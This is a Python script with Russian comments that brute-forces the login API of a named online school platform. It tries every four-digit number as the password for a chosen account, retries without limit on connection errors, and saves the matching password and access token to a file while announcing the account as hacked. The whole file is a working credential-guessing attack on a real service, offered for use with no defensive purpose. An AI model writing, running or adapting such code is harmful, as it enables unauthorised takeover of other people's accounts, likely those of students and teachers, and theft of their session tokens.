import requests, os

s = requests.Session()

login = input("Введите логин который надо забрутить: ")

#Все числа от 1000 до 10000 возможные пароли. Их перебираем как пароли
for password in range(1000, 10000):

	#Ссылка на API для логина онлайн мектеп
	url = "https://onlinemektep.org/api/v2/os/login"

	#Данные для авторизации
	login_data = {"login": login, "password": str(password)}

	#Делаем запрос на API онлайн мектеп
	while True:
		try:
			response = s.post(url, json=login_data)
			break
		except Exception as e:
			print("Не получилось подключится к сайту.")
			continue

	#Строку конвертируем с JSON в формат питона
	try:
		response = response.json()
	except Exception as e:
		print("Логин(не пароль а логин) не верный")
		break

	#Если в ответе на запрос к API есть "success", то значит пароль правильный.
	if "success" in response:
		print("Аккаунт успешно взломан\nЛогин: {}\nПароль: {}\nТокен: {}".format(login, str(password), str(response["access_token"])))

		#Создаем файл и туда сохраняем результат брута
		try:
			with open(os.path.join(os.getcwd(), "result", login + "_result.txt"), 'w', encoding="utf-8") as f:
				f.write("Логин: {}\nПароль: {}\nТокен: {}".format(login, str(password), str(response["access_token"])))

		except Exception as e:
			print("Не удалось сохранить в файл.")

		#Останавливаем брут
		break

	else:
		print("Пароль {} не верный!".format(str(password)))

input("Нажмите на любую кнопку для выхода...")
